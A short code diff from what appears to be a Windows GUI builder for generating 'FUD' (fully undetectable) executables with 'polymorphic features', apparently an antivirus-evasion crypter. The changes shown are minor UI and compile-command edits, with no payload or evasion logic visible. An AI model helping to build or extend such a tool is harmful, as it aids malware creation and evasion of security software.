@@ -889,7 +889,7 @@ static void populateControls() {
 }
 
 // File browser functions
-void browseForFile(HWND hEdit, BOOL isInput) {
+static void browseForFile(HWND hEdit, BOOL isInput) {
     OPENFILENAMEA ofn;
     char szFile[260] = {0};
     
@@ -1161,8 +1161,8 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             return 0;
         }
         
-        case WM_USER + 5: {
-            // Source only (compilation failed)
+        case WM_USER + 6: {
+            // Source only (compilation failed) - Alternative message
             isGenerating = FALSE;
             SetWindowTextAnsi(hGenerateButton, "Generate FUD Executable");
             EnableWindow(hGenerateButton, TRUE);
@@ -1172,7 +1172,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 "Auto-compilation failed, but VS2022-optimized source code has been saved.\n\n"
                 "Manual VS2022 compilation:\n"
                 "1. Open VS2022 Developer Command Prompt\n"
-                "2. Run: cl /O2 /MT /GL /LTCG source.cpp /Fe:output.exe /link user32.lib\n"
+                "2. Run: cl /O1 /MT /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n"
                 "3. Or open source in VS2022 IDE and build with Release configuration\n\n"
                 "The source includes enterprise-grade polymorphic features.",
                 "VS2022 Source Generated", MB_OK | MB_ICONINFORMATION);
